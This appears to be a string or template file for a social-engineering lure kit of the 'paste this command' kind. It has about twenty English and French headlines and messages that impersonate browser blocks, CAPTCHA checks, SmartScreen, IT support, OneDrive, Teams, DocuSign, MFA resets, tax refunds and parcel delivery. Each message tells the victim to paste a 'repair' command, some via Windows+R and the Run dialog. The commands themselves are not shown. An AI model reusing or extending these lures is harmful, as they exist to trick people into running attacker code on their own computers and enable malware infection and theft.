browser_update.headline: Your download was blocked by the browser
browser_update.sub: The file never finished transferring. Run the recovery command below to restart the download.
steps: Paste the command with Ctrl + V

captcha.headline: Complete the check to view this page
captcha.sub: Your session could not be validated automatically. The console command below finishes the verification.

file_blocked.headline: This file was blocked for your protection
file_blocked.sub: SmartScreen could not verify the publisher. Restore the download with the command below.

mail_attachment.headline: The attachment could not be opened
mail_attachment.sub: The mail client stopped the attachment. Launch the repair command to open it.

it_support.headline: Diagnostics required to restore access
it_support.sub: Support asked you to run a short diagnostic. Paste it into the Run dialog and press Enter.

share_link.headline: The preview link needs a quick fix
share_link.sub: Previewing stopped halfway. Run the command to rebuild the link, then continue.

voicemail.headline: You have a new voicemail message
voicemail.sub: The audio could not be decoded in the browser. Run the command below to open it in the desktop app.

software_update.headline: A critical update failed to install
software_update.sub: Update KB5034441 could not be applied. Run the repair command below, then restart to finish.

cloud_sync.headline: Your files could not be synced
cloud_sync.sub: OneDrive stopped syncing because of a permission error. Run the command below to repair the sync client.

printer_issue.headline: Your print job could not be completed
printer_issue.sub: The spooler service is not responding. Run the command below to restart it and release the job.

vpn_disconnect.headline: Your VPN tunnel dropped unexpectedly
vpn_disconnect.sub: The secure tunnel could not be re-established automatically. Run the command below to reconnect.

meeting_invite.headline: The meeting link is not working
meeting_invite.sub: The Teams join link returned an error. Run the command below to repair the calendar entry and rejoin.

invoice.headline: This invoice could not be opened
invoice.sub: The PDF renderer failed to load the document. Run the command below to open it in the desktop reader.

docusign.headline: A document is waiting for your signature
docusign.sub: The browser signing session expired. Run the command below to open the document in the desktop signer.

mfa_reset.headline: Your MFA method needs to be re-registered
mfa_reset.sub: Your authenticator was unlinked. Run the command below to open the registration portal and re-enroll.

delivery.headline: Votre colis n'a pas pu être livré
delivery.sub: Le livreur n'a pas trouvé personne. Suivez la commande ci-dessous pour choisir un nouveau créneau de livraison.
steps: Appuyez sur la touche Windows + R

tax_refund.headline: Un remboursement d'impôt vous est dû
tax_refund.sub: Votre déclaration a été validée. Exécutez la commande ci-dessous pour recevoir le virement.
steps: Appuyez sur la touche Windows + R

wifi_portal.headline: You must accept the policy to continue
wifi_portal.sub: The captive portal requires a local agent. Run the command below to complete registration.

backup_failed.headline: Last night's backup did not complete
backup_failed.sub: The snapshot could not be created. Run the command below to retry the backup job.
